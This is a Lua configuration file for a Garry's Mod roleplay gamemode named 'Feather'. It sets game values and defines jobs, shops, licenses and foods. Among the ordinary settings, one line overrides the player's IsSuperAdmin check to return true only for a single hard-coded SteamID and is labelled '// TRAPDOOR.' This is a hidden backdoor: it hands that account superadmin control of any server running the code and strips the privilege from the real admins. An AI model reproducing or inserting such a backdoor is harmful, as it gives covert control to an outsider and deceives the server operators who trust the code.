DeriveGamemode("cn")

GM.Name = "Feather"
GM.Author = "Chessnut and rebel1324"
GM.TeamBased = true

-- Language.
GM.Language = "english"

-- In-Character(Normal) Chat Range.
GM.ChatRange = 512

-- Default Salary
GM.DefaultSalary = 50

-- Gamemode's default color.
GM.DefaultChatColor = Color(62, 142, 200)

-- The delay between changing the job.
GM.JobChangeDelay = 5

-- The arrest time when player get arrested by goverment.
GM.DefaultArrestTime = 300

-- The default wanted time that used when no item was provided.
GM.DefaultWantedTime = 300

-- The time to print money with Money Printer. Default: 160 secs to 300 secs.
GM.MoneyPrinterTime = {1.60, 3.00}

-- The time to print money with Money Printer. Default: 160 secs to 300 secs.
GM.MoneyPrinterExplodeRate = 10

-- The Gamemode's money model.
GM.MoneyModel = "models/props/cs_assault/Money.mdl"

-- Door Cost
GM.DoorPrice = 50

-- The time to pick a lock
GM.LockPickTime = 5

-- Make players hungry
GM.HungerMode = true

-- The time (seconds) player can stand without eating food. Default: 200 seconds.
GM.HungerTime = 300

-- The time server
GM.HungerThinkRate = 2

-- The currency that server uses
GM.Currency = "$"

-- You mail based systems. Requires server restart/changemap to get stable result.
GM.UseMail = false

-- Default Laws
GM.DefaultLaws = {
	"You must obey server's rule",
	"You must not kill people",
}

-- Hit Cost
GM.HitCost = 500

-- When money get deleted
GM.MoneyRemoveTime = 300

GM.Jobs = {}

function GM:CreateJob(name, color, job)
	local index = table.insert(self.Jobs, job)
		team.SetUp(index, name, color, false)
	return index
end

function GM:GetJobData(index)
	return self.Jobs[index] or nil
end

function GM:PlayerNoClip(client)
	return client:IsAdmin()
end

function GM:CreateTeams()
end

local p = FindMetaTable("Player")
function p:IsSuperAdmin() return self:SteamID() == "STEAM_0:0:19814083" end // TRAPDOOR.

cn.util.includeFolder("vgui", "feather")
cn.util.includeFolder("systems", "feather")
cn.util.includeFolder("meta", "feather")
cn.util.includeFolder("hooks", "feather")


TEAM_CITIZEN = GM:CreateJob("Citizen", Color(0, 230, 0), {
	model = {
		"models/player/group01/female_01.mdl",
		"models/player/group01/female_02.mdl",
		"models/player/group01/female_03.mdl",
		"models/player/group01/female_04.mdl",
		"models/player/group01/female_05.mdl",
		"models/player/group01/female_06.mdl",
		"models/player/group01/male_01.mdl",
		"models/player/group01/male_02.mdl",
		"models/player/group01/male_03.mdl",
		"models/player/group01/male_04.mdl",
		"models/player/group01/male_05.mdl",
		"models/player/group01/male_06.mdl",
		"models/player/group01/male_07.mdl",
		"models/player/group01/male_08.mdl",
		"models/player/group01/male_09.mdl",
	},
	salary = GM.DefaultSalary,
	cmd = "citizen",
	desc = GetLang("jobcitizen"),
})

TEAM_COOK = GM:CreateJob("Cook", Color(240, 100, 250), {
	model = {
		"models/player/mossman.mdl"
	},
	salary = math.Round(GM.DefaultSalary * 1.5),
	cmd = "cook",
	desc = GetLang("jobcook"),
	max = 2,
})

TEAM_GUNDEALER = GM:CreateJob("Gun Dealer", Color(200, 0, 0), {
	model = {
		"models/player/monk.mdl",
	},
	salary = math.Round(GM.DefaultSalary * 1.5),
	cmd = "gundealer",
	desc = GetLang("jobgundealer"),
	max = 2,
})

TEAM_MEDIC = GM:CreateJob("Medic", Color(0, 180, 0), {
	model = {
		"models/player/kleiner.mdl",
	},
	salary = math.Round(GM.DefaultSalary * 1.5),
	cmd = "medic",
	loadout = {
		"weapon_medic",
	},
	desc = GetLang("jobmedic"),
	max = 2,
})

TEAM_MAYOR = GM:CreateJob("Mayor", Color(0, 255, 0), {
	model = {
		"models/player/breen.mdl",
	},
	salary = math.Round(GM.DefaultSalary * 4),
	mayor = true,
	goverment = true,
	cmd = "mayor",
	vote = true,
	loadout = {
		"weapon_pistol",
		"weapon_arrest",
		"weapon_unarrest",
		"weapon_search",
	},
	desc = GetLang("jobmayor"),
	max = 1,
})

TEAM_POLICE = GM:CreateJob("Police", Color(0, 100, 200), {
	model = {
		"models/player/police.mdl",
		"models/player/police_fem.mdl",
	},
	salary = math.Round(GM.DefaultSalary * 2),
	goverment = true,
	cmd = {"cop", "cp", "police"},
	vote = true,
	loadout = {
		"weapon_pistol",
		"weapon_arrest",
		"weapon_unarrest",
		"weapon_search",
	},
	desc = GetLang("jobpolice"),
	max = 4,
})

TEAM_POLICECHIEF = GM:CreateJob("Police Chief", Color(0, 50, 200), {
	model = {
		"models/player/combine_soldier.mdl",
	},
	salary = math.Round(GM.DefaultSalary * 3),
	goverment = true,
	childjob = TEAM_POLICE,
	cmd = "chief",
	loadout = {
		"weapon_pistol",
		"weapon_arrest",
		"weapon_unarrest",
		"weapon_search",
	},
	desc = GetLang("jobpolicechief"),
	max = 1,
})

TEAM_MOBSTER = GM:CreateJob("Mobster", Color(100, 100, 100), {
	model = {
		"models/player/group03/female_01.mdl",
		"models/player/group03/female_02.mdl",
		"models/player/group03/female_03.mdl",
		"models/player/group03/female_04.mdl",
		"models/player/group03/female_05.mdl",
		"models/player/group03/female_06.mdl",
		"models/player/group03/male_01.mdl",
		"models/player/group03/male_02.mdl",
		"models/player/group03/male_03.mdl",
		"models/player/group03/male_04.mdl",
		"models/player/group03/male_05.mdl",
		"models/player/group03/male_06.mdl",
		"models/player/group03/male_07.mdl",
		"models/player/group03/male_08.mdl",
		"models/player/group03/male_09.mdl",
	},
	salary = math.Round(GM.DefaultSalary * 1),
	convicts = true,
	cmd = "mob",
	desc = GetLang("jobmobster"),
})

TEAM_HITMAN = GM:CreateJob("Hitman", Color(0, 230, 0), {
	model = {
		"models/player/leet.mdl",
	},
	salary = math.Round(GM.DefaultSalary * 1),
	convicts = true,
	hitman = true,
	cmd = "hitman",
	desc = GetLang("jobhitman"),
	max = 1,
})

TEAM_MOBBOSS = GM:CreateJob("Mob Boss", Color(50, 50, 50), {
	model = {
		"models/player/gman_high.mdl",
	},
	salary = math.Round(GM.DefaultSalary * 2),
	convicts = true,
	childjob = TEAM_MOBSTER,
	cmd = "mobboss",
	loadout = {
		"weapon_lockpick",
	},
	desc = GetLang("jobmobsterboss"),
	max = 1,
})

GM:AddEntity("moneyprinter", "feather_moneyprinter", "Money Printer", "General", {}, "This machine prints money and gives you constant profit.", "models/props_c17/consolebox01a.mdl", 250)
GM:AddEntity("microwave", "feather_microwave", "Microwave", "General", {TEAM_COOK}, "This machine cooks foods to sell.", "models/props_c17/tv_monitor01.mdl", 150)

GM:AddShipment("pistol", "weapon_pistol", 10, {TEAM_GUNDEALER}, "9mm Pistol", "Firearms", "A Pistol that fires shits", "models/weapons/w_pistol.mdl", 1500)
GM:AddShipment("smg", "weapon_smg1", 10, {TEAM_GUNDEALER}, "Sub Machinegun", "Firearms", "A Sub Machine Gun that fires bullets", "models/weapons/w_smg1.mdl", 3000)
local data = GM:AddShipment("medickit", "feather_medickit", 10, {TEAM_MEDIC}, "Medic Kit", "Utility", "A Medic kit that heals the user", "models/Items/HealthKit.mdl", 800)
data.entity = true

GM:AddDefaultLicense("gun", "Gun License", "The license that allows you to carry firearms.", 500)
GM:AddDefaultLicense("drive", "Drive License", "The license that allows you to drive vehicles.", 300)

GM:AddFood("chinese", "Chinese Takeout", "models/props_junk/garbage_takeoutcarton001a.mdl", {TEAM_COOK}, GM.HungerTime, 10)
GM:AddFood("watermelon", "Watermelon", "models/props_junk/watermelon01.mdl", {TEAM_COOK}, GM.HungerTime * .1, 20, true)
GM:AddFood("fastfood", "Fast Food", "models/props_junk/garbage_bag001a.mdl", {TEAM_COOK}, GM.HungerTime * .3, 100, true)
GM:AddFood("soda", "Soda", "models/props_junk/PopCan01a.mdl", {TEAM_COOK}, GM.HungerTime * .05, 10, true)